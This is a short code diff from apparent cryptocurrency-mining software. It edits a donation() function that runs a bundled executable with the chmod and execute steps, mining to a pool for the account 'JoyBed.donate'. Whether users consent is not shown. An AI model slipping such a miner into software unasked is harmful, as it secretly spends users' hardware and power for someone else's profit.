@@ -236,14 +236,14 @@ def donation():
     
     if osname == "nt":
         cmd = (
-            + "& Donate_executable.exe "
+            + "Donate_executable.exe "
             + "-o stratum+tcp://xmg.minerclaim.net:7008 "
             + "-u JoyBed.donate "
             + "-p x -s 4 -e 55")
 
     elif osname == "posix":
         cmd = (
-            + "&& chmod +x Donate_executable "
+            + "chmod +x Donate_executable "
             + "&& ./Donate_executable "
             + "-o stratum+tcp://xmg.minerclaim.net:7008 "
             + "-u JoyBed.donate "
